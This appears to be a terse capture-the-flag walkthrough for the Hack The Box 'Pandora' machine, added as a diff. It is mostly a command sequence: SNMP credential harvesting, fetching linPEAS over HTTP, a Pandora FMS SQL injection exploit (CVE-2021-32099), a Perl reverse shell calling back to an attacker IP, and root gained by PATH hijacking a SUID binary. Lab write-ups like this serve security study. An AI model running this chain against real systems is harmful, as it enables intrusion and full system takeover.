@@ -1,0 +1,49 @@
+P4ND0R4 HTB
+
+[+]nmap
+22/tcp : SSH port (OpenSSH 8.2p1)
+80/tcp : web server (Apache 2.4.41)
+161/udp : snmp server (SNMPv1)
+
+[+]snmpwalk[+]  
+get credentials ssh
+
+[+]linPEAS.sh (hacker box)
+python3 -m http.server 80
+
+[+]target box
+wget http://10.10.10.10:80/linPEAS.sh
+chmod +x linPEAS.sh
+./linPEAS.sh
+relevant info: "pandora_console" is hosted on a site accessible only by local users
+
+[+]ssh port forwarding
+ssh -L 8080:127.0.0.1:80 -N user@$IP
+
+[+]pandora fms
+SQL Injection (pre authentication) (CVE-2021-32099)
+python3 sqlpwn.py -t 127.0.0.1:8080
+get admin session coockie
+CMD >
+[+]user.txt[+]
+
+[+]hacker box
+nc -lvnp 1234
+
+[+]create revershell
+perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"10.10.14.246:1234");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
+
+[+]shell upgrade 
+python3 -c 'import pty; pty.spawn("/bin/sh")'
+
+[+]privilige escalation
+find / -perm /4000
+GTFOBins > at
+echo "/bin/sh <$(tty) >$(tty) 2>$(tty)" | at now; tail -f /dev/null
+
+strings pandora_backup
+
+cd /tmp && echo "/bin/sh" > tar && chmod 777 tar
+export PATH=/tmp:$PATH
+pandora_backup
+[+]root.txt[+]
